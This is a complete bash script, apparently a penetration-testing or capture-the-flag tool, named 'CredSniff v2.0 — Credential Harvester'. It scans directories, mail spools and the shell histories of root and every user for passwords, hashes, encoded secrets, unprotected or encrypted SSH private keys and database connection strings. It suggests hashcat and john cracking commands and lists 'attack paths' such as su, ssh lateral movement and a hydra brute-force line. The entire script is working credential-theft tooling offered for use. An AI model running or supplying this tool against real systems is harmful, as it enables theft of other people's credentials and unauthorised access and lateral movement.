#!/bin/bash
# ============================================================================
#   CredSniff v2.0 — Credential Harvester
#   dirsearch-style credential extraction with real-time findings output
#   Usage: ./credsniff.sh -p "user1|user2|password" [-d /var] [-e conf,txt] [-o report]
# ============================================================================

# ── Colors ──────────────────────────────────────────────────────────────────
R='\033[0;31m'    G='\033[0;32m'    Y='\033[0;33m'
B='\033[0;34m'    M='\033[0;35m'    C='\033[0;36m'
W='\033[1;37m'    DIM='\033[2m'     RST='\033[0m'

# ── Defaults ────────────────────────────────────────────────────────────────
TARGET_DIR_RAW="/var"
declare -a TARGET_DIRS=()
PATTERN=""
OUTFILE=""
WORDLIST=""
EXTENSIONS=""
THREADS=10
QUIET=0
FULL_REPORT=0
HISTORY_MODE=0
FOUND_COUNT=0
FILES_SCANNED=0

declare -a CRED_PAIRS=()
declare -a HASHES=()
declare -a B64_FINDS=()
declare -a KEY_FINDS=()
declare -a ATTACK_PATHS=()

# ── Helpers ─────────────────────────────────────────────────────────────────
ts() { date +"%H:%M:%S"; }

out() {
    echo -e "$1"
    [[ -n "$OUTFILE" ]] && echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTFILE"
}

# dirsearch-style finding line: [HH:MM:SS] TYPE  - detail  (source)
finding() {
    local type="$1" detail="$2" src="$3"
    local color
    case "$type" in
        CRED)  color="$R" ;;
        HASH)  color="$Y" ;;
        B64)   color="$M" ;;
        KEY)   color="$R" ;;
        MAIL)  color="$C" ;;
        HIST)  color="$Y" ;;
        MATCH) color="$G" ;;
        *)     color="$W" ;;
    esac
    FOUND_COUNT=$((FOUND_COUNT + 1))
    out "[$(ts)] ${color}$(printf '%-5s' "$type")${RST} - ${W}${detail}${RST}     ${DIM}${src}${RST}"
}

# ── Banner ──────────────────────────────────────────────────────────────────
banner() {
    [[ $QUIET -eq 1 ]] && return
    echo -e "${C}"
    cat << 'BANNER'
   ___ ___ ___ ___  ___ _  _ ___ ___ ___
  / __| _ \ __|   \/ __| \| |_ _| __| __|
 | (__|   / _|| |) \__ \ .` || || _|| _|
  \___|_|_\___|___/|___/_|\_|___|_| |_|
BANNER
    echo -e "${RST}"
    echo -e "  ${DIM}v2.0${RST} | ${Y}Credential Harvester${RST}"
    echo ""
}

# ── Usage ───────────────────────────────────────────────────────────────────
usage() {
    echo -e "${W}Usage:${RST}"
    echo "  credsniff.sh [options] -p PATTERN"
    echo ""
    echo -e "${W}Options:${RST}"
    echo "  -d DIR        Target directory (default: /var)"
    echo "                  Use + for multiple subdirs: /var/mail+lib+www"
    echo "  -p PATTERN    Grep-E pattern (e.g. \"admin|root|password\")"
    echo "  -w FILE       Load patterns from wordlist (one per line)"
    echo "  -e EXTS       File extension filter, comma-sep (e.g. conf,php,txt,xml)"
    echo "  -o FILE       Save report to file"
    echo "  -t NUM        Parallel grep threads (default: 10)"
    echo "  -H            History mode — hunt history files for credential-leaking commands"
    echo "  -q            Quiet mode — findings only, no banner"
    echo "  -F            Full report — append detailed breakdown at end"
    echo "  -h            Show this help"
    echo ""
    echo -e "${W}Examples:${RST}"
    echo "  credsniff.sh -p \"admin|root|password\""
    echo "  credsniff.sh -d /home -p \"charles|sam\" -e conf,txt,php"
    echo "  credsniff.sh -w users.txt -d /var -o loot.txt -F"
    echo "  credsniff.sh -d /var/mail+lib+www -p \"admin|password\""
    echo "  credsniff.sh -d /etc -p \"db_pass|mysql\" -q"
    echo "  credsniff.sh -H -p \"charles\"          hunt histories for charles"
    exit 0
}

# ── Argument parsing ───────────────────────────────────────────────────────
while getopts "d:p:o:w:e:t:HqFh" opt; do
    case $opt in
        d) TARGET_DIR_RAW="$OPTARG" ;;
        p) PATTERN="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        e) EXTENSIONS="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        H) HISTORY_MODE=1 ;;
        q) QUIET=1 ;;
        F) FULL_REPORT=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ── Wordlist loading ───────────────────────────────────────────────────────
if [[ -n "$WORDLIST" ]]; then
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${R}[!] Wordlist not found: ${WORDLIST}${RST}"
        exit 1
    fi
    wl_pattern=$(grep -v '^#' "$WORDLIST" | grep -v '^$' | paste -sd'|')
    if [[ -n "$PATTERN" ]]; then
        PATTERN="${PATTERN}|${wl_pattern}"
    else
        PATTERN="$wl_pattern"
    fi
fi

if [[ -z "$PATTERN" && $HISTORY_MODE -eq 0 ]]; then
    echo -e "${R}[!] Error: -p PATTERN, -w WORDLIST, or -H required${RST}"
    usage
fi

# ── Expand + syntax: /var/mail+lib+www → /var/mail /var/lib /var/www ───────
if [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
    IFS='+' read -ra parts <<< "$TARGET_DIR_RAW"
    base=$(dirname "${parts[0]}")
    for part in "${parts[@]}"; do
        if [[ "$part" == "${parts[0]}" ]]; then
            TARGET_DIRS+=("$part")
        else
            TARGET_DIRS+=("${base}/${part}")
        fi
    done
else
    TARGET_DIRS=("$TARGET_DIR_RAW")
fi

for td in "${TARGET_DIRS[@]}"; do
    if [[ ! -d "$td" ]]; then
        echo -e "${R}[!] Error: $td is not a directory or does not exist${RST}"
        exit 1
    fi
done

# ── Build grep include args for extension filtering ────────────────────────
INCLUDE_ARGS=()
if [[ -n "$EXTENSIONS" ]]; then
    IFS=',' read -ra exts <<< "$EXTENSIONS"
    for ext in "${exts[@]}"; do
        INCLUDE_ARGS+=(--include="*.${ext}")
    done
fi

# ── Hash identification ────────────────────────────────────────────────────
identify_hash() {
    local hash="$1"
    local len=${#hash}

    if [[ "$hash" =~ ^\$2[aby]?\$ ]]; then
        echo "bcrypt|hashcat -m 3200 / john --format=bcrypt"; return; fi
    if [[ "$hash" =~ ^\$6\$ ]]; then
        echo "sha512crypt|hashcat -m 1800 / john --format=sha512crypt"; return; fi
    if [[ "$hash" =~ ^\$5\$ ]]; then
        echo "sha256crypt|hashcat -m 7400 / john --format=sha256crypt"; return; fi
    if [[ "$hash" =~ ^\$1\$ ]]; then
        echo "md5crypt|hashcat -m 500 / john --format=md5crypt"; return; fi
    if [[ "$hash" =~ ^\$apr1\$ ]]; then
        echo "APR1-MD5|hashcat -m 1600 / john --format=md5crypt-long"; return; fi
    if [[ $len -eq 32 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
        echo "MD5/NTLM|hashcat -m 0 (MD5) or -m 1000 (NTLM)"; return; fi
    if [[ $len -eq 40 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{40}$ ]]; then
        echo "SHA-1|hashcat -m 100 / john --format=raw-sha1"; return; fi
    if [[ $len -eq 64 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{64}$ ]]; then
        echo "SHA-256|hashcat -m 1400 / john --format=raw-sha256"; return; fi
    if [[ $len -eq 128 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{128}$ ]]; then
        echo "SHA-512|hashcat -m 1700 / john --format=raw-sha512"; return; fi
    if [[ $len -eq 16 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{16}$ ]]; then
        echo "MySQL323|hashcat -m 200 / john --format=mysql"; return; fi
    if [[ $len -eq 13 ]] && [[ "$hash" =~ ^[a-zA-Z0-9./]{13}$ ]]; then
        echo "DES-crypt|hashcat -m 1500 / john --format=descrypt"; return; fi

    echo "unknown|hash-identifier or hashid"
}

# ── Base64 detection ──────────────────────────────────────────────────────
check_base64() {
    local str="$1"
    if [[ ${#str} -ge 8 ]] && [[ "$str" =~ ^[A-Za-z0-9+/]{4,}={0,2}$ ]]; then
        local decoded
        decoded=$(echo "$str" | base64 -d 2>/dev/null)
        if [[ $? -eq 0 ]] && [[ -n "$decoded" ]]; then
            if echo "$decoded" | grep -qP '^[\x20-\x7E\n\r\t]+$'; then
                echo "$decoded"
                return 0
            fi
        fi
    fi
    return 1
}

# ── Credential pair extraction ────────────────────────────────────────────
extract_cred_context() {
    local line="$1"
    local file="$2"

    # user:password patterns
    if [[ "$line" =~ ([a-zA-Z0-9._-]+)[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
        local u="${BASH_REMATCH[1]}"
        local p="${BASH_REMATCH[2]}"
        if [[ ! "$u" =~ ^(http|https|ftp|ssh|tcp|udp|localhost|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)$ ]]; then
            if [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev|tmp|proc|sys|sbin) ]]; then
                CRED_PAIRS+=("${file}|${u}|${p}")
                finding "CRED" "${u}:${p}" "${file}"
            fi
        fi
    fi

    # password = value / password: value
    if [[ "$line" =~ [Pp](ass(word|wd)?)[[:space:]]*[=:][[:space:]]*[\"\']*([^\"\'[:space:]]+) ]]; then
        local pw="${BASH_REMATCH[3]}"
        if [[ ${#pw} -ge 2 ]]; then
            CRED_PAIRS+=("${file}|password_field|${pw}")
            finding "CRED" "password_field:${pw}" "${file}"
        fi
    fi

    # DB connection strings
    if [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
        local svc="${BASH_REMATCH[1]}" u="${BASH_REMATCH[2]}" p="${BASH_REMATCH[3]}"
        CRED_PAIRS+=("${file}|${svc}://${u}|${p}")
        finding "CRED" "${svc}://${u}:${p}" "${file}"
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN SCAN
# ══════════════════════════════════════════════════════════════════════════════
main() {
    banner

    [[ -n "$OUTFILE" ]] && : > "$OUTFILE"

    # ── Config display (dirsearch style) ──────────────────────────────────
    if [[ $QUIET -eq 0 ]]; then
        local ext_display=""
        [[ -n "$EXTENSIONS" ]] && ext_display=" | ${W}Extensions:${RST} ${EXTENSIONS}"
        local wl_display=""
        [[ -n "$WORDLIST" ]] && wl_display="\n ${W}Wordlist:${RST} ${WORDLIST} ($(grep -cv '^#\|^$' "$WORDLIST" 2>/dev/null || echo 0) entries)"

        # Truncate pattern display if loaded from wordlist
        local pat_display="$PATTERN"
        [[ ${#pat_display} -gt 80 ]] && pat_display="${pat_display:0:77}..."

        local dir_display="${TARGET_DIRS[*]}"
        out " ${W}Target:${RST} ${C}${dir_display}${RST} | ${W}Pattern:${RST} ${C}${pat_display}${RST}${ext_display} | ${W}Threads:${RST} ${THREADS}"
        [[ -n "$wl_display" ]] && out "$wl_display"
        [[ -n "$OUTFILE" ]] && out " ${W}Output:${RST} ${OUTFILE}"
        out ""
    fi

    local start_time=$(date +%s)
    for td in "${TARGET_DIRS[@]}"; do
        out "[$(ts)] Starting: ${C}${td}${RST}"
    done

    # ── Scans: Pattern-dependent (skipped if no pattern set) ─────────────
    if [[ -n "$PATTERN" ]]; then

    # ── Scan: Pattern matching ────────────────────────────────────────────
    local match_files
    if [[ ${#INCLUDE_ARGS[@]} -gt 0 ]]; then
        match_files=$(grep -rlE "${INCLUDE_ARGS[@]}" "$PATTERN" "${TARGET_DIRS[@]}" 2>/dev/null | grep -v "Binary file")
    else
        match_files=$(grep -rlE "$PATTERN" "${TARGET_DIRS[@]}" 2>/dev/null | grep -v "Binary file")
    fi

    if [[ -n "$match_files" ]]; then
        while IFS= read -r file; do
            FILES_SCANNED=$((FILES_SCANNED + 1))
            local matches
            matches=$(grep -nE "$PATTERN" "$file" 2>/dev/null)

            while IFS= read -r match_line; do
                [[ -z "$match_line" ]] && continue
                local line_num="${match_line%%:*}"
                local content="${match_line#*:}"
                # Trim content for clean single-line output
                content=$(echo "$content" | sed 's/^[[:space:]]*//')
                [[ ${#content} -gt 120 ]] && content="${content:0:117}..."

                finding "MATCH" "${content}" "${file}:${line_num}"
                extract_cred_context "$content" "$file"
            done <<< "$matches"
        done <<< "$match_files"
    fi

    # ── Scan: Hash detection ──────────────────────────────────────────────
    local shadow_hashes
    shadow_hashes=$(grep -rnoE '\$[0-9a-z]+\$[^\s:]{8,}' "${TARGET_DIRS[@]}" 2>/dev/null | grep -v "Binary file" | head -30)

    if [[ -n "$shadow_hashes" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            local src="${line%%:*}"
            local rest="${line#*:}"
            local ln="${rest%%:*}"
            local hash="${rest#*:}"

            local id_result
            id_result=$(identify_hash "$hash")
            local hash_type="${id_result%%|*}"
            local crack_cmd="${id_result#*|}"

            finding "HASH" "${hash_type}: ${hash:0:50}..." "${src}:${ln}"
            HASHES+=("${hash_type}|${hash}|${crack_cmd}|${src}")
            ATTACK_PATHS+=("Crack ${hash_type} from ${src} → ${crack_cmd}")
        done <<< "$shadow_hashes"
    else
        # Try standalone hex hashes
        local hex_hashes
        hex_hashes=$(grep -rnoEh '\b[a-fA-F0-9]{32,128}\b' "${TARGET_DIRS[@]}" 2>/dev/null | grep -v "Binary file" | head -30)

        if [[ -n "$hex_hashes" ]]; then
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                [[ ${#line} -gt 130 ]] && continue
                local id_result
                id_result=$(identify_hash "$line")
                local hash_type="${id_result%%|*}"
                local crack_cmd="${id_result#*|}"

                if [[ "$hash_type" != "unknown" ]]; then
                    finding "HASH" "${hash_type}: ${line:0:50}..." "hex-grep"
                    HASHES+=("${hash_type}|${line}|${crack_cmd}|inline")
                fi
            done <<< "$hex_hashes"
        fi
    fi

    # ── Scan: Base64 detection ────────────────────────────────────────────
    local b64_strings
    b64_strings=$(grep -rnoEh '[A-Za-z0-9+/]{12,}={0,2}' "${TARGET_DIRS[@]}" 2>/dev/null | \
                  grep -v "Binary file" | sort -u | head -50)

    if [[ -n "$b64_strings" ]]; then
        while IFS= read -r b64; do
            [[ -z "$b64" ]] && continue
            local decoded
            decoded=$(check_base64 "$b64")
            if [[ $? -eq 0 ]] && [[ -n "$decoded" ]]; then
                if echo "$decoded" | grep -qiE "pass|user|key|token|secret|admin|root|login|cred|auth|flag"; then
                    finding "B64" "→ ${decoded:0:80}" "base64"
                    B64_FINDS+=("${b64}|${decoded}")
                    ATTACK_PATHS+=("Decoded base64: ${decoded:0:60}")
                fi
            fi
        done <<< "$b64_strings"
    fi

    # ── Scan: SSH keys ────────────────────────────────────────────────────
    local key_files
    key_files=$(grep -rl "PRIVATE KEY" "${TARGET_DIRS[@]}" 2>/dev/null)

    if [[ -n "$key_files" ]]; then
        while IFS= read -r kf; do
            [[ -z "$kf" ]] && continue
            local key_type="Unknown"
            grep -q "RSA" "$kf" 2>/dev/null && key_type="RSA"
            grep -q "DSA" "$kf" 2>/dev/null && key_type="DSA"
            grep -q "EC" "$kf" 2>/dev/null && key_type="EC"
            grep -q "OPENSSH" "$kf" 2>/dev/null && key_type="OpenSSH"

            local status="unprotected"
            grep -q "ENCRYPTED" "$kf" 2>/dev/null && status="encrypted"

            finding "KEY" "${key_type} private key (${status})" "${kf}"
            KEY_FINDS+=("${kf}|${key_type}|${status}")

            if [[ "$status" == "encrypted" ]]; then
                ATTACK_PATHS+=("Crack ${key_type} key: ssh2john ${kf} > key.hash && john key.hash")
            else
                ATTACK_PATHS+=("Use ${key_type} key: chmod 600 ${kf} && ssh -i ${kf} user@target")
            fi
        done <<< "$key_files"
    fi

    # ── Scan: Mail ────────────────────────────────────────────────────────
    local mail_dirs=()
    for td in "${TARGET_DIRS[@]}"; do
        mail_dirs+=("${td}/mail" "${td}/spool/mail")
    done

    for mdir in "${mail_dirs[@]}"; do
        [[ ! -d "$mdir" ]] && continue
        local mfiles
        mfiles=$(ls -1 "$mdir" 2>/dev/null)
        [[ -z "$mfiles" ]] && continue

        while IFS= read -r mf; do
            [[ -z "$mf" ]] && continue
            local full="${mdir}/${mf}"
            [[ ! -r "$full" ]] && continue

            if grep -qiE "$PATTERN" "$full" 2>/dev/null; then
                local match_preview
                match_preview=$(grep -m1 -iE "$PATTERN" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
                [[ ${#match_preview} -gt 100 ]] && match_preview="${match_preview:0:97}..."
                finding "MAIL" "Pattern hit: ${match_preview}" "${full}"
                extract_cred_context "$match_preview" "$full"
            fi

            if grep -qiE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null; then
                local cred_line
                cred_line=$(grep -m1 -iE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
                [[ ${#cred_line} -gt 100 ]] && cred_line="${cred_line:0:97}..."
                finding "MAIL" "Cred keyword: ${cred_line}" "${full}"
                extract_cred_context "$cred_line" "$full"
                ATTACK_PATHS+=("Read mail: cat ${full}")
            fi
        done <<< "$mfiles"
    done

    fi # end pattern-dependent scans

    # ── Scan: History hunting (-H) ────────────────────────────────────────
    if [[ $HISTORY_MODE -eq 1 ]]; then
        # Credential-leaking command patterns in shell history
        local hist_pattern='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|mysqladmin[[:space:]].*-p|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|ftp[[:space:]].*:[^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*[^[:space:]]|--password[=[:space:]][^[:space:]]|-passwd[[:space:]]+[^[:space:]]|net[[:space:]]+use.*\/[Pp]:[^[:space:]]'

        # Collect all readable history files
        local hist_files=()
        for f in \
            /root/.bash_history \
            /root/.zsh_history \
            /root/.sh_history \
            /home/*/.bash_history \
            /home/*/.zsh_history \
            /home/*/.sh_history \
            /home/*/.local/share/fish/fish_history \
            ~/.bash_history \
            ~/.zsh_history; do
            # glob expansion — only add readable files, no duplicates
            [[ -f "$f" && -r "$f" ]] && hist_files+=("$f")
        done

        # Deduplicate via associative array
        declare -A _seen_hist=()
        declare -a unique_hist=()
        for f in "${hist_files[@]}"; do
            local real
            real=$(realpath "$f" 2>/dev/null || echo "$f")
            if [[ -z "${_seen_hist[$real]+x}" ]]; then
                _seen_hist[$real]=1
                unique_hist+=("$real")
            fi
        done

        if [[ ${#unique_hist[@]} -eq 0 ]]; then
            out "[$(ts)] ${DIM}HIST  - no readable history files found${RST}"
        else
            for hf in "${unique_hist[@]}"; do
                local owner
                owner=$(stat -c '%U' "$hf" 2>/dev/null || echo "?")

                # Search for credential-leaking commands
                local hits
                hits=$(grep -nE "$hist_pattern" "$hf" 2>/dev/null)
                if [[ -n "$hits" ]]; then
                    while IFS= read -r hit; do
                        [[ -z "$hit" ]] && continue
                        local ln="${hit%%:*}"
                        local cmd="${hit#*:}"
                        cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                        [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
                        finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
                        extract_cred_context "$cmd" "$hf"
                        ATTACK_PATHS+=("Review history: grep -n '.' ${hf}")
                    done <<< "$hits"
                fi

                # Also grep for user pattern if provided
                if [[ -n "$PATTERN" ]]; then
                    local pat_hits
                    pat_hits=$(grep -nE "$PATTERN" "$hf" 2>/dev/null)
                    if [[ -n "$pat_hits" ]]; then
                        while IFS= read -r hit; do
                            [[ -z "$hit" ]] && continue
                            local ln="${hit%%:*}"
                            local cmd="${hit#*:}"
                            cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                            [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
                            finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
                            extract_cred_context "$cmd" "$hf"
                        done <<< "$pat_hits"
                    fi
                fi
            done
        fi
    fi

    # ══════════════════════════════════════════════════════════════════════
    #  TASK COMPLETED
    # ══════════════════════════════════════════════════════════════════════
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    out ""
    out "${G}Task Completed${RST} ${DIM}| ${duration}s | ${FILES_SCANNED} files scanned | ${FOUND_COUNT} findings${RST}"

    # ── Extracted credentials summary ─────────────────────────────────────
    if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
        out ""
        out " ${W}Extracted Credentials${RST}"
        out " ${DIM}─────────────────────────────────────────────────────────────${RST}"
        local -A seen_creds
        for entry in "${CRED_PAIRS[@]}"; do
            local src="${entry%%|*}"
            local rest="${entry#*|}"
            local user="${rest%%|*}"
            local pass="${rest#*|}"
            local key="${user}:${pass}"

            if [[ -z "${seen_creds[$key]+x}" ]]; then
                seen_creds[$key]=1
                out "  ${C}${user}${RST}:${R}${pass}${RST}  ${DIM}← ${src}${RST}"
            fi
        done
    fi

    # ── Hashes summary ────────────────────────────────────────────────────
    if [[ ${#HASHES[@]} -gt 0 ]]; then
        out ""
        out " ${W}Hashes${RST}"
        out " ${DIM}─────────────────────────────────────────────────────────────${RST}"
        for entry in "${HASHES[@]}"; do
            IFS='|' read -r htype hash crack src <<< "$entry"
            out "  ${Y}${htype}${RST}  ${hash:0:60}  ${DIM}← ${src}${RST}"
            out "    ${DIM}crack:${RST} ${Y}${crack}${RST}"
        done
    fi

    # ── SSH Keys summary ──────────────────────────────────────────────────
    if [[ ${#KEY_FINDS[@]} -gt 0 ]]; then
        out ""
        out " ${W}SSH Keys${RST}"
        out " ${DIM}─────────────────────────────────────────────────────────────${RST}"
        for entry in "${KEY_FINDS[@]}"; do
            IFS='|' read -r path ktype enc <<< "$entry"
            out "  ${R}${ktype}${RST} (${enc})  ${DIM}${path}${RST}"
        done
    fi

    # ── Base64 summary ────────────────────────────────────────────────────
    if [[ ${#B64_FINDS[@]} -gt 0 ]]; then
        out ""
        out " ${W}Decoded Secrets${RST}"
        out " ${DIM}─────────────────────────────────────────────────────────────${RST}"
        for entry in "${B64_FINDS[@]}"; do
            local enc="${entry%%|*}"
            local dec="${entry#*|}"
            out "  ${M}${enc:0:40}...${RST} → ${R}${dec}${RST}"
        done
    fi

    # ── Attack paths ──────────────────────────────────────────────────────
    if [[ ${#ATTACK_PATHS[@]} -gt 0 ]]; then
        out ""
        out " ${W}Attack Paths${RST}"
        out " ${DIM}─────────────────────────────────────────────────────────────${RST}"
        local i=1
        local -A seen_paths
        for path in "${ATTACK_PATHS[@]}"; do
            if [[ -z "${seen_paths[$path]+x}" ]]; then
                seen_paths[$path]=1
                out "  ${G}${i}.${RST} ${path}"
                i=$((i + 1))
            fi
        done
        out ""
        out "  ${DIM}Quick wins:${RST}"
        out "    ${Y}su - <user>${RST}                    try extracted passwords"
        out "    ${Y}ssh <user>@localhost${RST}            lateral movement"
        out "    ${Y}hydra -L users -P passes ssh://target${RST}"
    fi

    # ── Full report (detailed boxes, if -F) ───────────────────────────────
    if [[ $FULL_REPORT -eq 1 ]]; then
        out ""
        out " ${DIM}══════════════════════════════════════════════════════════════${RST}"
        out " ${W}FULL REPORT${RST}"
        out " ${DIM}══════════════════════════════════════════════════════════════${RST}"

        if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
            out ""
            out "  ${R}┌─ Potential Credentials ─────────────────────────────────────┐${RST}"
            local -A seen2
            for entry in "${CRED_PAIRS[@]}"; do
                local src="${entry%%|*}"
                local rest="${entry#*|}"
                local user="${rest%%|*}"
                local pass="${rest#*|}"
                local key="${user}::${pass}"
                if [[ -z "${seen2[$key]+x}" ]]; then
                    seen2[$key]=1
                    out "  ${R}│${RST} ${W}User:${RST} ${C}${user}${RST}"
                    out "  ${R}│${RST} ${W}Pass:${RST} ${R}${pass}${RST}"
                    out "  ${R}│${RST} ${DIM}From: ${src}${RST}"
                    out "  ${R}│${RST}"
                fi
            done
            out "  ${R}└─────────────────────────────────────────────────────────────┘${RST}"
        fi

        if [[ ${#HASHES[@]} -gt 0 ]]; then
            out ""
            out "  ${Y}┌─ Hashes ────────────────────────────────────────────────────┐${RST}"
            for entry in "${HASHES[@]}"; do
                IFS='|' read -r htype hash crack src <<< "$entry"
                out "  ${Y}│${RST} ${W}Type:${RST}  ${htype}"
                out "  ${Y}│${RST} ${W}Hash:${RST}  ${hash:0:72}"
                out "  ${Y}│${RST} ${W}Crack:${RST} ${Y}${crack}${RST}"
                out "  ${Y}│${RST} ${DIM}From: ${src}${RST}"
                out "  ${Y}│${RST}"
            done
            out "  ${Y}└─────────────────────────────────────────────────────────────┘${RST}"
        fi

        if [[ ${#B64_FINDS[@]} -gt 0 ]]; then
            out ""
            out "  ${M}┌─ Base64 Decoded ────────────────────────────────────────────┐${RST}"
            for entry in "${B64_FINDS[@]}"; do
                local enc="${entry%%|*}"
                local dec="${entry#*|}"
                out "  ${M}│${RST} ${W}Encoded:${RST} ${enc:0:50}..."
                out "  ${M}│${RST} ${W}Decoded:${RST} ${R}${dec}${RST}"
                out "  ${M}│${RST}"
            done
            out "  ${M}└─────────────────────────────────────────────────────────────┘${RST}"
        fi

        if [[ ${#KEY_FINDS[@]} -gt 0 ]]; then
            out ""
            out "  ${B}┌─ SSH Keys ──────────────────────────────────────────────────┐${RST}"
            for entry in "${KEY_FINDS[@]}"; do
                IFS='|' read -r path ktype enc <<< "$entry"
                out "  ${B}│${RST} ${W}File:${RST}      ${path}"
                out "  ${B}│${RST} ${W}Type:${RST}      ${ktype}"
                out "  ${B}│${RST} ${W}Encrypted:${RST} ${enc}"
                out "  ${B}│${RST}"
            done
            out "  ${B}└─────────────────────────────────────────────────────────────┘${RST}"
        fi
    fi

    # ── Nothing found ─────────────────────────────────────────────────────
    local total=$((${#CRED_PAIRS[@]} + ${#HASHES[@]} + ${#B64_FINDS[@]} + ${#KEY_FINDS[@]}))
    if [[ $total -eq 0 && $FOUND_COUNT -eq 0 ]]; then
        out ""
        out "  ${Y}No credentials found.${RST}"
        out ""
        out "  ${W}Try:${RST}"
        out "    ${C}credsniff.sh -p \"pass|cred|secret|key|token|auth\"${RST}"
        out "    ${C}credsniff.sh -d /home -p \"<username>\"${RST}"
        out "    ${C}credsniff.sh -d /etc -p \"db_pass|mysql\" -e conf${RST}"
        out "    ${DIM}cat ~/.bash_history /home/*/.bash_history${RST}"
    fi

    out ""
    [[ -n "$OUTFILE" ]] && out "${G}Report saved:${RST} ${OUTFILE}"
}

main
